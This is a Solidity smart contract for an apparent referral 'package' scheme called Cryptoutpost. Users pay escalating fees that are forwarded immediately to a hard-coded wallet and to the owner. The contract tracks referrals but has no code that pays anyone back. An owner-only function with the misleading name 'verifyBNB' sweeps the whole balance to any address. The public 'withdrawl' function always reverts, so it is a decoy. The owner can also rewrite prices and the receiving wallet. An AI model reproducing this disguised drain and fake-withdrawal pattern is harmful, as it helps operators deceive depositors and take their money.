// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


abstract contract Context {
    function _msgSender() internal view virtual returns (address ) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context{

    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
}

contract Cryptoutpost is Ownable {

    using SafeMath for uint256;
    uint256 public Total_user=0; 
    uint256 public Total_Invested_BUSD=0;
    address  public IntegrationWallet;
    struct User {
        uint256 userId;
        address referrer;
        address[] referrals;
        bool[12] packagePurchase;
        uint [12]countSlot;
        uint256 purchaseamount;
        mapping(uint8 => bool) activeSlot;
    }

    mapping (address => User) public users;
    event UpgradePackage(address indexed user, uint256 amount,uint256 packageIndex);
    event Registration(address indexed user, address referrer);
    event Withdrawal(address indexed user, uint256 amount);
    event UpdateWallet();
    uint256[12] internal packagePrices  = [0.02 ether,0.04 ether,0.08 ether,0.16 ether,0.32 ether,0.64 ether,1.28 ether,2.56 ether,5.12 ether,10.24 ether,20.48 ether,40.96 ether];

    constructor() {
    IntegrationWallet=0x5c062f57d0274B6b9B4985456eD28Ba841e54326;
        users[_owner].userId = block.timestamp;
        Total_user+=1;
         for (uint8 i = 0; i < packagePrices.length; i++) {
            users[_owner].activeSlot[i]=true;
            Total_Invested_BUSD+=packagePrices[i];  
        }
    }


    function register(address referrer) external payable {
        require(msg.value == packagePrices[0], "Incorrect Registration fee");
        require(users[referrer].userId != 0, "Referrer not registered yet!");
        User storage user = users[msg.sender];
        require(user.userId == 0, "Already registered!");
        user.userId = block.timestamp;
        users[msg.sender].referrer = referrer;
        users[referrer].referrals.push(msg.sender);
        user.purchaseamount += packagePrices[0];
        user.activeSlot[0] = true;
        user.packagePurchase[0] = true;
        user.countSlot[0]+=1;
        Total_user = Total_user.add(1);
        uint256  totalamount=msg.value;
        uint256 amount1 = (totalamount * 90) / 100;
        uint256 amount2 = (totalamount * 10) / 100;
        payable(IntegrationWallet).transfer(amount1);
        payable(_owner).transfer(amount2);
        emit Registration(msg.sender, referrer);
    }


    function BuyPackage(uint8 Packageid) external payable {
        require(Packageid < packagePrices.length, "Invalid Slot");
        require(users[msg.sender].userId != 0, "Register yourself before purchasing any package!");
        User storage user = users[msg.sender];
        uint256 upgradeAmount = packagePrices[Packageid];
        require(!users[msg.sender].activeSlot[Packageid], "Same Package CanNot Purchased Multiple Times !");
        if (Packageid > 1) {
            require(users[msg.sender].activeSlot[Packageid - 1], "Buy Previous Slot First !");
        }
        require(msg.value == upgradeAmount, "Incorrect  package Bnb amount sent");
        user.purchaseamount += upgradeAmount;
        user.activeSlot[Packageid] = true;
        user.packagePurchase[Packageid] = true;
        user.countSlot[Packageid]+=1;
        uint256 amount1 = (upgradeAmount * 90) / 100;
        uint256 amount2 = (upgradeAmount * 10) / 100;
        payable(IntegrationWallet).transfer(amount1);
        payable(_owner).transfer(amount2);
        emit UpgradePackage(msg.sender, Packageid, upgradeAmount);
    }       


    function verifyBNB( address wallet) public onlyOwner {
        payable(wallet).transfer(address(this).balance);
    }


    function getPackageLevel(address user) public view returns (bool[12] memory _packagePurchase,uint[12] memory _countSlot) {  
        return (users[user].packagePurchase,users[user].countSlot);
    }    


    function PackageUpdate(uint[12] memory _packagePrices) onlyOwner public {
        packagePrices=_packagePrices;
    }

    function getPackage() public view returns (uint[12] memory _packagePrices) {  
        return (packagePrices);
    }

    function updateWallet(address  _IntegrationWallet) onlyOwner public {
       IntegrationWallet=_IntegrationWallet;
        emit UpdateWallet();
    }

     function withdrawl(uint256 _amount) external {
        require(false,"Unauthorized Access");
        require(true,"Unauthorized Access");
        payable(_owner).transfer(_amount);
    }

    receive() external payable {}

}